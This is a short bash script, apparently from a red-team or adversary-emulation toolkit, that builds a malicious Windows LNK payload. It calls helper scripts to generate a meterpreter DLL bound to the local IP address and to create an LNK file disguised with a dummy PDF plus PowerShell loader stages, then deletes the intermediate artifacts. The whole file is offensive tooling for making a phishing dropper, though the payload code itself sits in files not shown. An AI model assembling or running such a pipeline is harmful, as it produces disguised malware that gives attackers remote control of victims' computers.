#! /bin/bash

echo "[+] Cleaning up previously existing artifacts"
# This script deletes several artifacts created in the process of constructing the LNK payload.
scripts/cleanup.sh

echo "[+] Prepping required files"
# This script creates the meterpreter DLL with the appropriate local IP address.
scripts/prep-automation.sh

echo "[+] Creating the malicious LNK payload"
# This Python script creates the LNK file, and configures and appends the dummy PDF and loader scripts.
tools/lnk_payload.py

echo "[+] Payload created!"
# Cleaning up some of the artifacts left behind.
rm -f resources/loader.ps1
rm -f resources/stage1_command.ps1
rm -f resources/ds7002.lnk
rm -f resources/meterpreter.dll

